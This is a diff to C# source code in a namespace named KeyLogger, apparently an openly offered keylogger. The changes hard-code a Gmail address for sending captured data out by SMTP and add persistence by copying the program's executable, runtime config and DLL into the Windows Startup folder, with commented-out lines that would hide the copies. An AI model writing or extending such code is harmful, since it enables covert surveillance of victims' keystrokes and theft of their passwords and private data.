@@ -273,7 +273,7 @@ namespace KeyLogger
             client.UseDefaultCredentials = false;
             client.EnableSsl = true;
             // email and password
-            client.Credentials = new NetworkCredential("email@gmail.com", "password");
+            client.Credentials = new NetworkCredential("susrock69420@gmail.com", "password");
             mailMessage.Body = emailBody;
 
             client.Send(mailMessage);
@@ -283,18 +283,31 @@ namespace KeyLogger
         {
 
             string thisFile = System.AppDomain.CurrentDomain.FriendlyName;
+            string thisFile1 = System.AppDomain.CurrentDomain.FriendlyName;
+            string thisFile2 = System.AppDomain.CurrentDomain.FriendlyName;
 
             string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile + ".exe";
+            string Path1 = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile1 + ".runtimeconfig" + ".json";
+            string Path2 = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile2 + ".dll";
 
             string Filepath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile + ".exe";
+            string Filepath1 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile1 + ".runtimeconfig" + ".json";
+            string Filepath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile2 + ".dll";
 
             try
             {
 
                 //COPY THIS PROGRAM TO STARTUP
-                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile + ".exe"))
+                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile + ".exe") 
+                    && !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile1 + ".runtimeconfig" + ".json") 
+                    && !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + thisFile2 + ".dll"))
                 {
                     File.Copy(Path, Filepath);
+                    File.Copy(Path1, Filepath1);
+                    File.Copy(Path2, Filepath2);
+                    //File.SetAttributes(Filepath, File.GetAttributes(Filepath) | FileAttributes.Hidden);
+                    //File.SetAttributes(Filepath1, File.GetAttributes(Filepath1) | FileAttributes.Hidden);
+                    //File.SetAttributes(Filepath2, File.GetAttributes(Filepath2) | FileAttributes.Hidden);
                 }
 
             }
